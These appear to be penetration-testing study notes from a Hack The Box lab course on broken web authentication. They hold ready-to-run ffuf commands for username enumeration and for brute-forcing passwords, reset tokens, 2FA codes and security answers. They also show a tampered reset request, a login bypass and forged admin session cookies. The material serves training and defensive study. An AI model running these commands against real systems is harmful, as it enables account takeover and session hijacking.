# Broken Authentication
## Default Credentials
If we're dealing w/ a known solution, try to search and test for default credentials still in use !
## Enumerating Users
[Usernames Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Usernames)
- Look for different messages error like 'unknow creds' or 'invalid creds for user paul' etc
```bash
# Enumerate usernames w/ ffuf filtering w/ error messages
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```
## Bruteforcing Passwords
Create a wordlist of passwords that match the following password policy : 
- contains at least one upper-case character
- contains at least one lower-case character
- contains at least one digit
- minimum length of 10 characters
```bash
# Cutting rockyou.txt to match password policy
grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt

# Bruteforcing passwords using ffuf based on error messages
ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```
## Bruteforcing Passwords Reset Tokens
Basic password reset flow
![image](https://academy.hackthebox.com/storage/modules/269/bf/reset_bf_1.png)
- Here is an example of a password reset e-mail received : 
```
Hello,

We have received a request to reset the password associated with your account. To proceed with resetting your password, please follow the instructions below:

1. Click on the following link to reset your password: Click

2. If the above link doesn't work, copy and paste the following URL into your web browser: http://weak_reset.htb/reset_password.php?token=7351

Please note that this link will expire in 24 hours, so please complete the password reset process as soon as possible. If you did not request a password reset, please disregard this e-mail.

Thank you.
```
- We'll use `ffuf` to bruteforce all possible reset tokens
```bash
# Generate numbers from 0 to 9999 to bruteforce all tokens 
seq -w 0 9999 > tokens.txt

# Bruteforcing tokens w/ ffuf based on error
ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```
## Bruteforcing 2FA codes
- We'll use `ffuf` to bruteforce all possible 2FA codes using 4-digit
```bash
# Generate numbers from 0 to 9999 to bruteforce all tokens 
seq -w 0 9999 > tokens.txt

# Bruteforcing tokens w/ ffuf based on error
ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```
## Guessable Password Reset Questions
- "`What is your mother's maiden name?`"
- "`What city were you born in?`"
These questions can often be obtained through `OSINT` or guessed, given a sufficient number of attempts, i.e., a lack of brute-force protection. For instance, [this](https://github.com/datasets/world-cities/blob/master/data/world-cities.csv) CSV file contains a list of more than 25,000 cities with more than 15,000 inhabitants from all over the world.
```bash
# Creating file that contains all cities for bruteforcing
cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
# Targeting file to contain only german cities
cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt

# Bruteforcing security question about city
ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."
```
- We could also manipulate the `password reset request` sent to target another user. In this example, we could try to `intercept` and `modify` this request by changing the parameter `username=test` to `username=admin` to `change the admin's password`
```http
POST /reset_password.php HTTP/1.1
Host: pwreset.htb
Content-Length: 32
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

password=P@$$w0rd&username=test
```
## Direct Access
We could request the protected resource directly from an unauthenticated context if the web application does not properly verify that the request is authenticated. If we know that the web app is redirecting users to the `/admin.php` endpoint after successful authentication, we could try to access the `/admin.php` endpoint directly to bypass the login page. While uncommon in real world, a slight variant occasionally happens in vulnerable web applications.
- We could modify the endpoint `/index.php` to `/admin.php` in the login request to try to access protected ressources 
```html
POST /index.php HTTP/1.1
Host: 94.237.54.190:30710
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://94.237.54.190:30710
Connection: keep-alive
Referer: http://94.237.54.190:30710/
Cookie: PHPSESSID=qtvp30ujc086ufq2nd5bdimkpf
Upgrade-Insecure-Requests: 1
X-PwnFox-Color: green
Priority: u=0, i

username=admin&password=admin
```
## Parameter Modification
An authentication implementation can be flawed if it depends on the presence or value of an HTTP parameter, introducing authentication vulnerabilities. This is closely related to authorization issues such as `Insecure Direct Object Reference (IDOR)` vulnerabilities. 
- If for example, after logging in, we are redirected to `/admin.php?user_id=183`
![image](https://academy.hackthebox.com/storage/modules/269/bypass/bypass_param_1.png)
- We could try to include another user's ID in `/admin.php?user_id=FUZZ` & brute force it to access admin session
## Session Tokens
Session tokens are unique identifiers a web application uses to identify a user. The session token is tied to the user's session. If an attacker can obtain a valid session token of another user, the attacker can impersonate the user to the web application, thus taking over their session.
![image](https://academy.hackthebox.com/storage/modules/269/session/session_2.png)
The session token is 32 characters long; thus, it seems infeasible to enumerate other users' valid sessions. However, let us send the login request multiple times and take note of the session tokens assigned by the web application. 
```
2c0c58b27c71a2ec5bf2b4b6e892b9f9
2c0c58b27c71a2ec5bf2b4546092b9f9
2c0c58b27c71a2ec5bf2b497f592b9f9
2c0c58b27c71a2ec5bf2b48bcf92b9f9
2c0c58b27c71a2ec5bf2b4735e92b9f9
```
- All session tokens are very similar. In fact, of the 32 characters, 28 are the same for all five captured sessions. The session tokens consist of the static string `2c0c58b27c71a2ec5bf2b4` followed by four random characters and the static string `92b9f9`. We could try to `bruteforce the 4 characters`
- Another vulnerable example would be an incrementing session identifier.
```
141233
141234
141237
141238
141240
```
We could increment or decrement our session token to obtain active sessions and hijack other users' accounts.
**Note:** it is important to capture multiple session tokens & analyze them
- Some token can be encoded (base64) and reveal interesting information
![image](https://academy.hackthebox.com/storage/modules/269/session/session_3.png)
```bash
# Decoding session token
echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d

user=htb-stdnt;role=user
```
We could try to `manipulate the cookie` to forge our own session token, and send it to the web app
```bash
# Creating admin session token
echo -n 'user=htb-stdnt;role=admin' | base64
```
![image](https://academy.hackthebox.com/storage/modules/269/session/session_4.png)
**Note:** We should also keep an eye out for data in hex-encoding or URL-encoding. For instance, a session token containing hex-encoded data might look like this:
![image](https://academy.hackthebox.com/storage/modules/269/session/session_5.png)
- Just like before, we could forge an admin cookie
```bash
# Forge an admin cookie based on hex-encoding
echo -n 'user=htb-stdnt;role=admin' | xxd -p
```
## Session Fixation
[Session Fixation](https://owasp.org/www-community/attacks/Session_fixation) is an attack that enables an attacker to obtain a victim's valid session. A web application vulnerable to session fixation does not assign a new session token after a successful authentication. If an attacker can coerce the victim into using a session token chosen by the attacker, session fixation enables an attacker to steal the victim's session and access their account.
For instance, assume a web application vulnerable to session fixation uses a session token in the HTTP cookie `session`. Furthermore, the web application sets the user's session cookie to a value provided in the `sid` GET parameter. Under these circumstances, a session fixation attack could look like this:
1. An attacker obtains a valid session token by authenticating to the web application. For instance, let us assume the session token is `a1b2c3d4e5f6`. Afterward, the attacker invalidates their session by logging out.
2. The attacker tricks the victim to use the known session token by sending the following link: `http://vulnerable.htb/?sid=a1b2c3d4e5f6`. When the victim clicks this link, the web application sets the `session` cookie to the provided value, i.e., the response looks like this:
```http
HTTP/1.1 200 OK
[...]
Set-Cookie: session=a1b2c3d4e5f6
[...]
```
1. The victim authenticates to the vulnerable web application. The victim's browser already stores the attacker-provided session cookie, so it is sent along with the login request. The victim uses the attacker-provided session token since the web application does not assign a new one.
2. Since the attacker knows the victim's session token `a1b2c3d4e5f6`, they can hijack the victim's session.
A web application must assign a new randomly generated session token after successful authentication to prevent session fixation attacks.
## Improper Session Timeout
Lastly, a web application must define a proper [Session Timeout](https://owasp.org/www-community/Session_Timeout) for a session token. After the time interval defined in the session timeout has passed, the session will expire, and the session token is no longer accepted. If a web application does not define a session timeout, the session token would be valid infinitely, enabling an attacker to use a hijacked session effectively forever.